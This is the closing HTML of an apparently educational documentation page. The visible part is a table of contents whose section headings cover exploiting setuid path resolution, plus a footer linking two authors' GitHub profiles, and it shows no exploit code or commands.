class="table-of-contents__link toc-highlight">Step-by-Step Exploitation</a></li><li><a href="#complete-exploit-demonstration" class="table-of-contents__link toc-highlight">Complete Exploit Demonstration</a></li><li><a href="#technical-analysis" class="table-of-contents__link toc-highlight">Technical Analysis</a><ul><li><a href="#path-resolution-mechanics" class="table-of-contents__link toc-highlight">Path Resolution Mechanics</a></li><li><a href="#setuid-privilege-model" class="table-of-contents__link toc-highlight">Setuid Privilege Model</a></li></ul></li><li><a href="#directory-structure-analysis" class="table-of-contents__link toc-highlight">Directory Structure Analysis</a></li><li><a href="#alternative-attack-vectors" class="table-of-contents__link toc-highlight">Alternative Attack Vectors</a></li><li><a href="#protection-bypass-analysis" class="table-of-contents__link toc-highlight">Protection Bypass Analysis</a><ul><li><a href="#why-common-defenses-fail" class="table-of-contents__link toc-highlight">Why Common Defenses Fail</a></li></ul></li><li><a href="#debugging-the-vulnerability" class="table-of-contents__link toc-highlight">Debugging the Vulnerability</a></li><li><a href="#key-learning-points" class="table-of-contents__link toc-highlight">Key Learning Points</a></li><li><a href="#code-review-lessons" class="table-of-contents__link toc-highlight">Code Review Lessons</a></li><li><a href="#technical-summary" class="table-of-contents__link toc-highlight">Technical Summary</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/docs/intro">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/Illouminus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Edouard Baillot<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://github.com/adrih1" target="_blank" rel="noopener noreferrer" class="footer__link-item">Adrien Hors<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div></div></footer></div>
</body>
</html>